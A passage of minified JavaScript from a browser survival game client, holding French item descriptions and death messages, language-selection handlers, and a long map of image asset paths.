        ve[le.GEMME_BLUE] = ["Gemme bleue", "Pour les gens trop gentils"];
        ve[le.CROWN_GREEN] = ["Couronne verte", "Te soigne très rapidement", "Soigne sur le temps: 40", "Défense: 4, Défense contre animaux: 16"];
        ve[le.CROWN_ORANGE] = ["Couronne orange", "Tu te sens soudainement très chanceux", "Défense: 4, Défense contre animaux: 16"];
        ve[le.CROWN_BLUE] = ["Couronne bleue", "Une fois mort, tu deviens un fantôme", "Tu perdras toutes tes arguments", "Défense: 4, Défense contre animaux: 16"];
        ve[le.BUCKET_FULL] = ["Seau", "Utile pour remplir un puit", "Un sceau est équivalent à 20 bouteilles"];
        ve[le.BUCKET_EMPTY] = ["Seau vide", "Pour remplir ce seau, approche-toi d'une source d'eau"];
        ve[le.BOTTLE_FULL] = ["Bouteille", "Te permet de boire n'importe où", "Eau: 50"];
        ve[le.BOTTLE_EMPTY] = ["Bouteille vide", "Tu peux remplir cette bouteille près d'une source d'eau"];
        ve[le.WATERING_CAN] = ["Arrosoir vide", "Doit être rempli près d'une source d'eau"];
        ve[le.WATERING_CAN_FULL] = ["Arrosoir", "Permet d'arroser les plantes", "Dégâts: 1"];
        ve[le.BAG] = ["Sac", "Plus de place dans ton inventaire!"];
        ve[le.PAPER] = ["Papier", "Pour fabriquer toute sorte d'objets"];
        ve[le.BOOK] = ["Livre", "Réduit considérablement le temps de fabrication", "Doit être porté pour fonctionner", "Dégâts: 1"];
        ve[le.BANDAGE] = ["Bandage", "Soigne plus rapidement", "Soigne sur le temps: 30", "Effet: 5"];
        ve[le.LOCK] = ["Cadenas", "Pour verrouiller un coffre"];
        ve[le.LOCKPICK] = ["Clé", "Pour déverrouiller un coffre"];
        ve[le.TOTEM] = ["Totem", "Te permet de créer une équipe", "Partage les portes et les coffres", "Les piques ne toucheront pas tes amis"];
        ve[le.BRIDGE] = ["Pont", "Très utile sur l'eau", "Te permet de boire sans te noyer", "Marche plus vite sur l'eau"];
        ve[le.SIGN] = ["Pancarte", "Laisse un message aux autres", "Durabilité: 200"];
        ve[le.ROOF] = ["Toit", "Te cache un peu et te réchauffe"];
        ve[le.WELL] = ["Puit", "Permet de remplir des bouteilles", "Durabilité: 1000"];
        ve[le.WALL] = ["Mur en bois", "Tu connais la danse des murs?", "Durabilité: 1000"];
        ve[le.STONE_WALL] = ["Mur en pierre", "Ça fait un peu plus sérieux", "Durabilité: 1500"];
        ve[le.GOLD_WALL] = ["Mur en or", "De l'or sur tes murs? C'est un peu voyant", "Durabilité: 2000"];
        ve[le.DIAMOND_WALL] = ["Mur en diamant", "Très brillant, cache tes yeux", "Durabilité: 2500"];
        ve[le.AMETHYST_WALL] = ["Mur en améthyste", "Tu dois avoir très peur de sortir dehors!", "Durabilité: 3500"];
        ve[le.SPIKE] = ["Piques en bois", "Peut blesser tes ennemis", "Dégâts: 10, Dégâts par coup: 2", "Durabilité: 150"];
        ve[le.STONE_SPIKE] = ["Pique en pierre", "Je ne voudrais pas être ton ennemi", "Dégâts: 20", "Dégâts par coup: 3", "Durabilité: 300"];
        ve[le.GOLD_SPIKE] = ["Pique en or", "Tu es si cruel", "Dégâts: 30", "Dégâts par coup: 3", "Durabilité: 600"];
        ve[le.DIAMOND_SPIKE] = ["Pique en diamant", "Tu n'as pas l'air d'aimer la compagnie", "Dégâts: 40", "Dégâts par coup: 4", "Durabilité: 1200"];
        ve[le.AMETHYST_SPIKE] = ["Pique en améthyste", "Mais qu'est ce que ton voisin t'a fait?", "Dégâts: 50", "Dégâts par coup: 4", "Durabilité: 2400"];
        ve[le.WOOD_DOOR] = ["Porte en bois", "Peut être ouvert ou fermé par toi ou tes amis", "Durabilité: 1000"];
        ve[le.STONE_DOOR] = ["Porte en pierre", "Tu connais les trois petits cochons?", "Durabilité: 1500"];
        ve[le.GOLD_DOOR] = ["Porte en or", "Tu reconstruis l'el dorado?", "Durabilité: 2000"];
        ve[le.DIAMOND_DOOR] = ["Porte en diamant", "Pour une maison éclatante", "Durabilité: 2500"];
        ve[le.AMETHYST_DOOR] = ["Porte en améthyste", "Est-ce que ta maison est un coffre-fort?", "Durabilité: 3000"];
        ve[le.FURNACE] = ["Chaudière", "Réchauffe", "Consume du bois toutes les 5 sec", "Durabilité: 1000"];
        ve[le.WINDMILL] = ["Moulin", "Peut produire de la farine à partir du blé", "Prends 5 sec pour faire de la farine", "Tu obtiens des points quand c'est en marche", "Durabilité: 2000"];
        ve[le.BREAD_OVEN] = ["Four à pain", "Produit du pain avec de la farine et du bois", "Prends 10 sec pour faire du pain", "Tu obtiens des points quand c'est en marche", "Durabilité: 2000"];
        ve[le.RESURRECTION] = ["Pierre de résurrection", "Magie magie!", "Te ressuscite si tu es un fantôme", "Tu perds toutes tes armes", "Durabilité: 200"];
        ve[TEXT.YOU_CANNOT_JOIN] = "Tu ne peux pas rejoindre le serveur";
        ve[TEXT.KICKED] = "Expulsé: ";
        ve[TEXT.KEY_ALREADY] = "Ta clé est déjà utilisée par quelqu'un d'autre";
        ve[TEXT.KEY_WRONG] = "Ta clé est fausse";
        ve[TEXT.OLD_VERSION] = "Tu as une vieille version, rafraichis tes caches";
        ve[TEXT.NO_MORE_RESOURCES] = "Il n'y a plus de nouvelles ressources";
        ve[TEXT.SURVIVED_1DAY] = "Tu as survécu 1 jour";
        ve[TEXT.SURVIVED] = "Tu as survécu ";
        ve[TEXT.DAYS] = " jours";
        ve[TEXT.DEAD_SAD] = "Tu es mort ;-;";
        ve[TEXT.SPAM_ME] = "Le serveur ne trouve pas de points d'apparitions! Spam le bouton jouer!";
        ve[TEXT.SPAM_ME2] = "Le serveur est complet! Spam le bouton jouer";
        ve[TEXT.EMPTY] = "Cette ressource est vide";
        ve[TEXT.INV_FULL] = "Ton inventaire est rempli (Clic droit pour supprimer un objet)";
        ve[TEXT.DEAD] = " est mort";
        ve[TEXT.WRONG_TOOL] = "Ce n'est pas le bon outil";
        ve[TEXT.JOIN_TEAM] = "Tu as rejoins une équipe";
        ve[TEXT.YOU_DEAD] = "Tu es mort";
        ve[TEXT.JOINED_TEAM] = " a rejoint l'équipe";
        ve[TEXT.TEAM_DESTROYED] = "Ton équipe a été détruite";
        ve[TEXT.LEFT_TEAM] = "Tu as quitté l'équipe";
        ve[TEXT.LEFT_TEAM2] = " a quitté l'équipe";
        ve[TEXT.TOKEN] = "Quelqu'un a volé ton token :>";
        ve[TEXT.CHOOSE] = "Choisis un serveur";
        ve[TEXT.PLAYERS] = "joueurs";
        ve[TEXT.TOTAL_PLAYERS] = "joueurs";
        ve[TEXT.TOTAL_MODE] = "joueurs dans ce mode";
        ve[TEXT.COMMING_SOON] = "Bientôt...";
        document.getElementById("nickname_input").placeholder = "Surnom";
        Le[0] = ["Tu as été tué sans raison particulière, juste comme ça"];
        Le[1] = ["Tu es mort de faim, c'est plutôt ironique, non?"];
        Le[2] = ["Tu es mort de froid. Dommage", "Tu as fait une hypothermie, la prochaine fois reste près d'un feu"];
        Le[3] = ["Un joueur t'a tué, avant de mourir tu pouvais l'entendre rire", "Un joueur t'a tué, avec un peu de chance il mourra aussi"];
        Le[4] = ["Tu es resté sur un feu trop longtemps et tu es mort suite aux brûlures", "Tu es mort en restant trop longtemps sur un feu, tu voulais finir comme Jeanne d'Arc?"];
        Le[5] = ["Ton corps deviendra un nid pour les oeufs d'araignées."];
        Le[6] = ["Ce loup n'aura plus faim après t'avoir mangé", "Ce ne sont pas des chiens. Les loups n'aiment pas être domestiqués."];
        Le[7] = ["Ce renard était trop rapide pour toi", "Ce renard t'a transformé en boîte"];
        Le[8] = ["Cet ours voulait juste un câlin."];
        Le[9] = ["Tu as été brûlé par un dragon. Quel gâchis", "Tu t'es fait écraser par un dragon. Une bien terrible façon de mourir..."];
        Le[10] = ["Tu as sauté sur des piques, c'était pas une bonne idée...", "Tu es mort sur des piques. La plupart des gens sont assez sensés pour ne pas toucher les choses pointues"];
        Le[11] = ["Même les fantômes peuvent mourir", "Tu n'as pas réussi à te ressusciter. Mais c'est un jeu, tu reviens à la vie après être mort, donc..."];
        Le[12] = ["Une bactérie logée dans la viande crue t'a tué. Ce jeu est vraiment trop dur.", "Tu as tué l'animal, sa viande t'a tué."];
        Le[13] = ["Tu es mort de soif. La prochaine fois, vas dans un lac, dans la mer ou fais-toi une bouteille"];
        Le[14] = ["Tu t'es noyé. Essaye de construire un pont la prochaine fois"];
        Le[15] = ["Ne t'inquiète pas, le piranha t'a trouvé appétissant."];
        Le[16] = ["Un kraken a 'kraké' tes os."];
        Le[17] = ["Ta peau tombe en lambeau, le soleil t'a brûlé."];
        Le[18] = ["L'ail dans ta poche a fait bouillir ton cerveau."];
        Le[19] = ["En tant que vampire, ne reste pas à côté des gousses d'ail."];
        Le[20] = ["Tu as mangé de l'ail en tant que vampire, tu t'attendais à quoi?"];
        Le[21] = ["Ton corps est tombé dans les ronces. En essayant de t'échapper, ta peau s'est arrachée et la douleur a fait arrêter de battre ton coeur. lol ça rime."];
        ZOMBIE_GRUMBLE = "Uuunnnggg";
        ZOMBIE_GRUMBLES = ["Uuunnnggg... J'ai faim", "Manger cerveau, Uuunnnggg...", "Viande fraîche ici... Uuunnnggg", "Uuunnnggg... Tu as l'air bon", "Uuunnnggg...", "Manger... uuunnnggg...", "Je peux sentir ton sang... Uuunnnggg"];
      }, ve = [], Me = 0; Me < 344; Me++) {
      ve[Me] = "";
    }
    var Le = [];
    $(".md-languages").on("click", function () {
      $(this).toggleClass("active");
    });
    $(".md-languages ul li").on("click", function () {
      var e = $(this).text();
      if (e === "English") {
        Ce();
      } else if (e === "Français") {
        me();
      } else if (e === "Deutsch") {
        Se();
      } else if (e === "Español") {
        De();
      } else if (e === "Português") {
        be();
      } else if (e === "Русский") {
        Ne();
      } else if (e === "Polski") {
        pe();
      }
      INFO_BOX = [];
      __.craft.label = [];
      $(".md-languages ul li").removeClass("active");
      $(this).addClass("active");
      $(".md-languages label button").text(e);
    });
    var Ge;
    se = "EN";
    switch (navigator.language || navigator.userLanguage) {
      case "ru":
        se = "RU";
        break;
      case "en":
        se = "EN";
        break;
      case "es":
        se = "SP";
        break;
      case "fr":
        se = "FR";
        break;
      case "pl":
        se = "PL";
        break;
      case "de":
        se = "DE";
        break;
      case "pt":
        se = "PT";
    }
    if (se === "FR") {
      $(".md-languages label button").text("Français");
      Ge = me;
    } else if (se === "PL") {
      $(".md-languages label button").text("Polski");
      Ge = pe;
    } else if (se === "PT") {
      $(".md-languages label button").text("Português");
      Ge = be;
    } else if (se === "SP") {
      $(".md-languages label button").text("Español");
      Ge = De;
    } else if (se === "RU") {
      $(".md-languages label button").text("Русский");
      Ge = Ne;
    } else if (se === "DE") {
      $(".md-languages label button").text("Deutsch");
      Ge = Se;
    } else {
      $(".md-languages label button").text("English");
      Ge = Ce;
    }
    IMAGES = {
      LOGO: "img/logo.png",
      BIGDAY: "img/mapday.png",
      BIGNIGHT: "img/mapnight.png",
      BIGZDAY: "img/bigzday.png",
      BIGZNIGHT: "img/bigznight.png",
      MAPDAY_RIVER: "img/bigday-river1.png",
      MAPDAY_LAKE: "img/bigday-lake.png",
      MAPDAY_BERRY: "img/bigday-berry.png",
      MAPDAY_STONE1: "img/bigday-stone1.png",
      MAPDAY_STONE2: "img/bigday-stone2.png",
      MAPDAY_GOLD1: "img/bigday-gold1.png",
      MAPDAY_GOLD2: "img/bigday-gold2.png",
      MAPDAY_EMERALD1: "img/bigday-emerald1.png",
      MAPDAY_EMERALD2: "img/bigday-emerald2.png",
      MAPDAY_AMETHYST: "img/bigday-amethyst.png",
      MAPDAY_BEAR: "img/bigday-bear.png",
      MAPDAY_CAVE: "img/bigday-cave.png",
      MAPDAY_DIAMOND: "img/bigday-diamond.png",
      MAPDAY_ISLAND: "img/bigday-island.png",
      MAPDAY_REIDITE: "img/bigday-reidite.png",
      MAPDAY_SPIDER: "img/bigday-spider.png",
      MAPDAY_WOLF: "img/bigday-wolf.png",
      MAPDAY_FIR_TREE: "img/bigday-fir-tree.png",
      MAPDAY_FOX: "img/bigday-fox.png",
      MAPDAY_KRAKEN: "img/bigday-kraken.png",
      MAPDAY_PIRANHA: "img/bigday-piranha.png",
      MAPDAY_CACTUS: "img/bigday-cactus.png",
      MAPDAY_MAGMA: "img/bigday-magma.png",
      MAPNIGHT_RIVER: "img/bigday-river1.png",
      MAPNIGHT_LAKE: "img/bignight-lake.png",
      MAPNIGHT_BERRY: "img/bignight-berry.png",
      MAPNIGHT_STONE1: "img/bignight-stone1.png",
      MAPNIGHT_STONE2: "img/bignight-stone2.png",
      MAPNIGHT_GOLD1: "img/bignight-gold1.png",
      MAPNIGHT_GOLD2: "img/bignight-gold2.png",
      MAPNIGHT_EMERALD1: "img/bignight-emerald1.png",
      MAPNIGHT_EMERALD2: "img/bignight-emerald2.png",
      MAPNIGHT_AMETHYST: "img/bignight-amethyst.png",
      MAPNIGHT_BEAR: "img/bignight-bear.png",
      MAPNIGHT_CAVE: "img/bignight-cave.png",
      MAPNIGHT_DIAMOND: "img/bignight-diamond.png",
      MAPNIGHT_ISLAND: "img/bignight-island.png",
      MAPNIGHT_REIDITE: "img/bignight-reidite.png",
      MAPNIGHT_SPIDER: "img/bignight-spider.png",
      MAPNIGHT_WOLF: "img/bignight-wolf.png",
      MAPNIGHT_FIR_TREE: "img/bignight-fir-tree.png",
      MAPNIGHT_FOX: "img/bignight-fox.png",
      MAPNIGHT_KRAKEN: "img/bignight-kraken.png",
      MAPNIGHT_PIRANHA: "img/bignight-piranha.png",
      MAPNIGHT_CACTUS: "img/bignight-cactus.png",
      MAPNIGHT_MAGMA: "img/bignight-magma.png",
      MAPDAY_DESERT: "img/bigday-desert.png",
      MAPDAY_WINTER: "img/bigday-winter.png",
      MAPDAY_LAVA: "img/bigday-lava.png",
      MAPDAY_FOREST: "img/bigday-forest.png",
      MAPNIGHT_DESERT: "img/bignight-desert.png",
      MAPNIGHT_WINTER: "img/bignight-winter.png",
      MAPNIGHT_LAVA: "img/bignight-lava.png",
      MAPNIGHT_FOREST: "img/bignight-forest.png",
      RIVER_WAVED: "img/day-river-wave.png",
      RIVER_WAVEN: "img/night-river-wave.png",
      FOG0D: "img/day-fog0.png",
      FOG1D: "img/day-fog1.png",
      FOG2D: "img/day-fog2.png",
      FOG0N: "img/night-fog0.png",
      FOG1N: "img/night-fog1.png",
      FOG2N: "img/night-fog2.png",
      FOD0D: "img/day-fogdesert0.png",
      FOD1D: "img/day-fogdesert1.png",
      FOD2D: "img/day-fogdesert2.png",
      FOD0N: "img/night-fogdesert0.png",
      FOD1N: "img/night-fogdesert1.png",
      FOD2N: "img/night-fogdesert2.png",
      MARKER0D: "img/day-cross-server.png",
      MARKER1D: "img/day-here-server.png",
      MARKER2D: "img/day-finish-server.png",
      MARKER3D: "img/day-item-server.png",
      MARKER0N: "img/night-cross-server.png",
      MARKER1N: "img/night-here-server.png",
      MARKER2N: "img/night-finish-server.png",
      MARKER3N: "img/night-item-server.png",
      REIDITE0D: "img/day-reidite0.png",
      REIDITE0N: "img/night-reidite0.png",
      REIDITE1D: "img/day-reidite1.png",
      REIDITE1N: "img/night-reidite1.png",
      REIDITE2D: "img/day-reidite2.png",
      REIDITE2N: "img/night-reidite2.png",
      MAGMA1D: "img/day-lava1.png",
      MAGMA1N: "img/night-lava1.png",
      MAGMA2D: "img/day-lava2.png",
      MAGMA2N: "img/night-lava2.png",
      MAGMA3D: "img/day-lava3.png",
      MAGMA3N: "img/night-lava3.png",
      MAGMA4D: "img/day-lava4.png",
      MAGMA4N: "img/night-lava4.png",
      MAGMA5D: "img/day-lava5.png",
      MAGMA5N: "img/night-lava5.png",
      MAGMA6D: "img/day-lava6.png",
      MAGMA6N: "img/night-lava6.png",
      LAVA_GROUND1D: "img/day-lava-ground1.png",
      LAVA_GROUND1N: "img/night-lava-ground1.png",
      LAVA_GROUND2D: "img/day-lava-ground2.png",
      LAVA_GROUND2N: "img/night-lava-ground2.png",
      LAVA_GROUND3D: "img/day-lava-ground3.png",
      LAVA_GROUND3N: "img/night-lava-ground3.png",
      LAVA_GROUND4D: "img/day-lava-ground4.png",
      LAVA_GROUND4N: "img/night-lava-ground4.png",
      LAVA_GROUND5D: "img/day-lava-ground5.png",
      LAVA_GROUND5N: "img/night-lava-ground5.png",
      LAVA_GROUND6D: "img/day-lava-ground6.png",
      LAVA_GROUND6N: "img/night-lava-ground6.png",
      FIRE_MOBD: "img/day-fire-mob.png",
      FIRE_MOBN: "img/night-fire-mob.png",
      FIRE_MOB_HURT: "img/hurt-fire-mob.png",
      DIAMOND_PROTECTIOND: "img/day-diamond-protection.png",
      DIAMOND_PROTECTIONN: "img/night-diamond-protection.png",
      HAND_DIAMOND_PROTECTIOND: "img/day-hand-diamond-protection.png",
      HAND_DIAMOND_PROTECTIONN: "img/night-hand-diamond-protection.png",
      INV_DIAMOND_PROTECTION_OUT: "img/inv-diamond-protection-out.png",
      INV_DIAMOND_PROTECTION_IN: "img/inv-diamond-protection-in.png",
      INV_DIAMOND_PROTECTION_CLICK: "img/inv-diamond-protection-click.png",
      AMETHYST_PROTECTIOND: "img/day-amethyst-protection.png",
      AMETHYST_PROTECTIONN: "img/night-amethyst-protection.png",
      HAND_AMETHYST_PROTECTIOND: "img/day-hand-amethyst-protection.png",
      HAND_AMETHYST_PROTECTIONN: "img/night-hand-amethyst-protection.png",
      INV_AMETHYST_PROTECTION_OUT: "img/inv-amethyst-protection-out.png",
      INV_AMETHYST_PROTECTION_IN: "img/inv-amethyst-protection-in.png",
      INV_AMETHYST_PROTECTION_CLICK: "img/inv-amethyst-protection-click.png",
      REIDITE_SWORDD: "img/day-reidite-sword.png",
      REIDITE_SWORDN: "img/night-reidite-sword.png",
      INV_REIDITE_SWORD_OUT: "img/inv-reidite-sword-out.png",
      INV_REIDITE_SWORD_IN: "img/inv-reidite-sword-in.png",
      INV_REIDITE_SWORD_CLICK: "img/inv-reidite-sword-click.png",
      INV_REIDITE_OUT: "img/inv-reidite-out.png",
      INV_REIDITE_IN: "img/inv-reidite-in.png",
      INV_REIDITE_CLICK: "img/inv-reidite-click.png",
      INV_FLAME_OUT: "img/inv-flame-out.png",
      INV_FLAME_IN: "img/inv-flame-in.png",
      INV_FLAME_CLICK: "img/inv-flame-click.png",
      LAVA_BUBLE0D: "img/day-magma-buble0.png",
      LAVA_BUBLE0N: "img/night-magma-buble0.png",
      LAVA_BUBLE1D: "img/day-magma-buble1.png",
      LAVA_BUBLE1N: "img/night-magma-buble1.png",
      LAVA_BUBLE2D: "img/day-magma-buble2.png",
      LAVA_BUBLE2N: "img/night-magma-buble2.png",
      LAVA_DRAGOND: "img/day-lava-dragon.png",
      LAVA_DRAGONN: "img/night-lava-dragon.png",
      LAVA_FIRE_DRAGOND: "img/day-fire-dragon.png",
      LAVA_FIRE_DRAGONN: "img/night-fire-dragon.png",
      HURT_LAVA_DRAGON: "img/hurt-lava-dragon.png",
      LAVA_WING_LEFTD: "img/day-lava-wing-left.png",
      LAVA_WING_LEFTN: "img/night-lava-wing-left.png",
      LAVA_WING_RIGHTD: "img/day-lava-wing-right.png",
      LAVA_WING_RIGHTN: "img/night-lava-wing-right.png",
      HURT_LAVA_WING_LEFT: "img/hurt-lava-wing-left.png",
      HURT_LAVA_WING_RIGHT: "img/hurt-lava-wing-right.png",
      REIDITE_SPEARD: "img/day-reidite-spear.png",
      REIDITE_SPEARN: "img/night-reidite-spear.png",
      INV_REIDITE_SPEAR_OUT: "img/inv-reidite-spear-out.png",
      INV_REIDITE_SPEAR_IN: "img/inv-reidite-spear-in.png",
      INV_REIDITE_SPEAR_CLICK: "img/inv-reidite-spear-click.png",
      REIDITE_HELMETD: "img/day-reidite-helmet.png",
      REIDITE_HELMETN: "img/night-reidite-helmet.png",
      INV_REIDITE_HELMET_OUT: "img/inv-reidite-helmet-out.png",
      INV_REIDITE_HELMET_IN: "img/inv-reidite-helmet-in.png",
      INV_REIDITE_HELMET_CLICK: "img/inv-reidite-helmet-click.png",
      HAND_REIDITE_PROTECTIOND: "img/day-hand-reidite-protection.png",
      HAND_REIDITE_PROTECTIONN: "img/night-hand-reidite-protection.png",
      REIDITE_PROTECTIOND: "img/day-reidite-protection.png",
      REIDITE_PROTECTIONN: "img/night-reidite-protection.png",
      INV_REIDITE_PROTECTION_OUT: "img/inv-reidite-protection-out.png",
      INV_REIDITE_PROTECTION_IN: "img/inv-reidite-protection-in.png",
      INV_REIDITE_PROTECTION_CLICK: "img/inv-reidite-protection-click.png",
      LAVA_SWORDD: "img/day-lava-dragon-sword.png",
      LAVA_SWORDN: "img/night-lava-dragon-sword.png",
      INV_LAVA_SWORD_OUT: "img/inv-lava-dragon-sword-out.png",
      INV_LAVA_SWORD_IN: "img/inv-lava-dragon-sword-in.png",
      INV_LAVA_SWORD_CLICK: "img/inv-lava-dragon-sword-click.png",
      LAVA_SPEARD: "img/day-lava-spear.png",
      LAVA_SPEARN: "img/night-lava-spear.png",
      INV_LAVA_SPEAR_OUT: "img/inv-lava-spear-out.png",
      INV_LAVA_SPEAR_IN: "img/inv-lava-spear-in.png",
      INV_LAVA_SPEAR_CLICK: "img/inv-lava-spear-click.png",
      LAVA_HELMETD: "img/day-lava-helmet.png",
      LAVA_HELMETN: "img/night-lava-helmet.png",
      INV_LAVA_HELMET_OUT: "img/inv-lava-helmet-out.png",
      INV_LAVA_HELMET_IN: "img/inv-lava-helmet-in.png",
      INV_LAVA_HELMET_CLICK: "img/inv-lava-helmet-click.png",
      WITCHD: "img/day-witch-hat.png",
      WITCHN: "img/night-witch-hat.png",
      INV_WITCH_OUT: "img/inv-witch-hat-out.png",
      INV_WITCH_IN: "img/inv-witch-hat-in.png",
      INV_WITCH_CLICK: "img/inv-witch-hat-click.png",
      NIMBUSD: "img/day-nimbus2000.png",
      NIMBUSN: "img/night-nimbus2000.png",
      INV_NIMBUS_OUT: "img/inv-nimbus2000-out.png",
      INV_NIMBUS_IN: "img/inv-nimbus2000-in.png",
      INV_NIMBUS_CLICK: "img/inv-nimbus2000-click.png",
      ACCESSORY1D: "img/day-accessory1-pacques.png",
      ACCESSORY1N: "img/night-accessory1-pacques.png",
      ACCESSORY2D: "img/day-accessory2-pacques.png",
      ACCESSORY2N: "img/night-accessory2-pacques.png",
      ACCESSORY3D: "img/day-accessory3-pacques.png",
      ACCESSORY3N: "img/night-accessory3-pacques.png",
      ACCESSORY5D: "img/day-accessory5-pacques.png",
      ACCESSORY5N: "img/night-accessory5-pacques.png",
      ACCESSORY6D: "img/day-accessory6-pacques.png",
      ACCESSORY6N: "img/night-accessory6-pacques.png",
      ACCESSORY7D: "img/day-accessory7-pacques.png",
      ACCESSORY7N: "img/night-accessory7-pacques.png",
      ACCESSORY8D: "img/day-accessory8-pacques.png",
      ACCESSORY8N: "img/night-accessory8-pacques.png",
      BAG_EASTERD: "img/day-bag-pacques.png",
      BAG_EASTERN: "img/night-bag-pacques.png",
      CARROTD: "img/day-carrot.png",
      CARROTN: "img/night-carrot.png",
      CARROT_DRIEDD: "img/day-carrot-dried.png",
      CARROT_DRIEDN: "img/night-carrot-dried.png",
      TOMATO_MINID: "img/day-tomato-herb.png",
      TOMATO_MININ: "img/night-tomato-herb.png",
      TOMATO_MINI_DRIEDD: "img/day-tomato-herb-dried.png",
      TOMATO_MINI_DRIEDN: "img/night-tomato-herb-dried.png",
      TOMATOD: "img/day-tomato.png",
      TOMATON: "img/night-tomato.png",
      INV_CARROT_OUT: "img/inv-carrot-out.png",
      INV_CARROT_IN: "img/inv-carrot-in.png",
      INV_CARROT_CLICK: "img/inv-carrot-click.png",
      INV_TOMATO_OUT: "img/inv-tomato-out.png",
      INV_TOMATO_IN: "img/inv-tomato-in.png",
      INV_TOMATO_CLICK: "img/inv-tomato-click.png",
      PLAYER0D: "img/day-player0.png",
      PLAYER0N: "img/night-player0.png",
      PLAYER1D: "img/day-player1.png",
      PLAYER1N: "img/night-player1.png",
      PLAYER2D: "img/day-player2.png",
      PLAYER2N: "img/night-player22.png",
      PLAYER3D: "img/day-player3.png",
      PLAYER3N: "img/night-player33.png",
      PLAYER4D: "img/day-player4.png",
      PLAYER4N: "img/night-player4.png",
      PLAYER5D: "img/day-player5.png",
      PLAYER5N: "img/night-player5.png",
      PLAYER6D: "img/day-player6.png",
      PLAYER6N: "img/night-player6.png",
      PLAYER7D: "img/day-player7.png",
      PLAYER7N: "img/night-player7.png",
      PLAYER8D: "img/day-player8.png",
      PLAYER8N: "img/night-player8.png",
      PLAYER9D: "img/day-player9.png",
      PLAYER9N: "img/night-player9.png",
      PLAYER10D: "img/day-player10.png",
      PLAYER10N: "img/night-player10.png",
      PLAYER11D: "img/day-player11.png",
      PLAYER11N: "img/night-player11.png",
      PLAYER12D: "img/day-player12.png",
      PLAYER12N: "img/night-player12.png",
      PLAYER13D: "img/day-player13.png",
      PLAYER13N: "img/night-player13.png",
      PLAYER14D: "img/day-player14.png",
      PLAYER14N: "img/night-player14.png",
      PLAYER15D: "img/day-player15.png",
      PLAYER15N: "img/night-player15.png",
      PLAYER16D: "img/day-player16.png",
      PLAYER16N: "img/night-player16.png",
      PLAYER17D: "img/day-player17.png",
      PLAYER17N: "img/night-player17.png",
      PLAYER18D: "img/day-player18.png",
      PLAYER18N: "img/night-player18.png",
      PLAYER19D: "img/day-player19.png",
      PLAYER19N: "img/night-player19.png",
      HAND0D: "img/day-hand-player0.png",
      HAND0N: "img/night-hand-player0.png",
      HAND1D: "img/day-hand-player1.png",
      HAND1N: "img/night-hand-player1.png",
      HAND2D: "img/day-hand-player2.png",
      HAND2N: "img/night-hand-player22.png",
      HAND3D: "img/day-hand-player3.png",
      HAND3N: "img/night-hand-player33.png",
      HAND4D: "img/day-hand-player4.png",
      HAND4N: "img/night-hand-player4.png",
      HAND5D: "img/day-hand-player5.png",
      HAND5N: "img/night-hand-player5.png",
      HAND6D: "img/day-hand-player6.png",
      HAND6N: "img/night-hand-player6.png",
      HAND7D: "img/day-hand-player7.png",
      HAND7N: "img/night-hand-player7.png",
      HAND8D: "img/day-hand-player8.png",
      HAND8N: "img/night-hand-player8.png",
      HAND9D: "img/day-hand-player9.png",
      HAND9N: "img/night-hand-player9.png",
      HAND10D: "img/day-hand-player10.png",
      HAND10N: "img/night-hand-player10.png",
      HAND11D: "img/day-hand-player11.png",
      HAND11N: "img/night-hand-player11.png",
      HAND12D: "img/day-hand-player12.png",
      HAND12N: "img/night-hand-player12.png",
      HAND13D: "img/day-hand-player13.png",
      HAND13N: "img/night-hand-player13.png",
      HAND14D: "img/day-hand-player14.png",
      HAND14N: "img/night-hand-player14.png",
      HAND15D: "img/day-hand-player15.png",
      HAND15N: "img/night-hand-player15.png",
      HAND16D: "img/day-hand-player16.png",
      HAND16N: "img/night-hand-player16.png",
      HAND17D: "img/day-hand-player17.png",
      HAND17N: "img/night-hand-player17.png",
      HAND18D: "img/day-hand-player18.png",
      HAND18N: "img/night-hand-player18.png",
      HAND19D: "img/day-hand-player19.png",
      HAND19N: "img/night-hand-player19.png",
      ACCESSORY4D: "img/day-accessory4.png",
      ACCESSORY4N: "img/night-accessory4.png",
      ACCESSORY9D: "img/day-accessory9.png",
      ACCESSORY9N: "img/night-accessory9.png",
      ACCESSORY10D: "img/day-accessory10.png",
      ACCESSORY10N: "img/night-accessory10.png",
      ACCESSORY11D: "img/day-accessory11.png",
      ACCESSORY11N: "img/night-accessory11.png",
      ACCESSORY12D: "img/day-accessory12.png",
      ACCESSORY12N: "img/night-accessory12.png",
      BAGD: "img/day-bag.png",
      BAGN: "img/night-bag.png",
      INV_BAG_OUT: "img/inv-bag-out.png",
      INV_BAG_IN: "img/inv-bag-in.png",
      INV_BAG_CLICK: "img/inv-bag-click.png",
      PITCHFORKD: "img/day-pitchfork.png",
      PITCHFORKN: "img/night-pitchfork.png",
      INV_PITCHFORK_OUT: "img/inv-pitchfork-out.png",
      INV_PITCHFORK_IN: "img/inv-pitchfork-in.png",
      INV_PITCHFORK_CLICK: "img/inv-pitchfork-click.png",
      INV_WOOD_DOOR_SPIKE_OUT: "img/inv-wood-spike-door-out.png",
      INV_WOOD_DOOR_SPIKE_IN: "img/inv-wood-spike-door-in.png",
      INV_WOOD_DOOR_SPIKE_CLICK: "img/inv-wood-spike-door-click.png",
      INV_STONE_DOOR_SPIKE_OUT: "img/inv-stone-spike-door-out.png",
      INV_STONE_DOOR_SPIKE_IN: "img/inv-stone-spike-door-in.png",
      INV_STONE_DOOR_SPIKE_CLICK: "img/inv-stone-spike-door-click.png",
      INV_GOLD_DOOR_SPIKE_OUT: "img/inv-gold-spike-door-out.png",
      INV_GOLD_DOOR_SPIKE_IN: "img/inv-gold-spike-door-in.png",
      INV_GOLD_DOOR_SPIKE_CLICK: "img/inv-gold-spike-door-click.png",
      INV_DIAMOND_DOOR_SPIKE_OUT: "img/inv-diamond-spike-door-out.png",
      INV_DIAMOND_DOOR_SPIKE_IN: "img/inv-diamond-spike-door-in.png",
      INV_DIAMOND_DOOR_SPIKE_CLICK: "img/inv-diamond-spike-door-click.png",
      INV_AMETHYST_DOOR_SPIKE_OUT: "img/inv-amethyst-spike-door-out.png",
      INV_AMETHYST_DOOR_SPIKE_IN: "img/inv-amethyst-spike-door-in.png",
      INV_AMETHYST_DOOR_SPIKE_CLICK: "img/inv-amethyst-spike-door-click.png",
      WOOD_DOOR_SPIKED: "img/day-wood-spike-door.png",
      WOOD_DOOR_SPIKEN: "img/night-wood-spike-door.png",
      STONE_DOOR_SPIKED: "img/day-stone-spike-door.png",
      STONE_DOOR_SPIKEN: "img/night-stone-spike-door.png",
      GOLD_DOOR_SPIKED: "img/day-gold-spike-door.png",
      GOLD_DOOR_SPIKEN: "img/night-gold-spike-door.png",
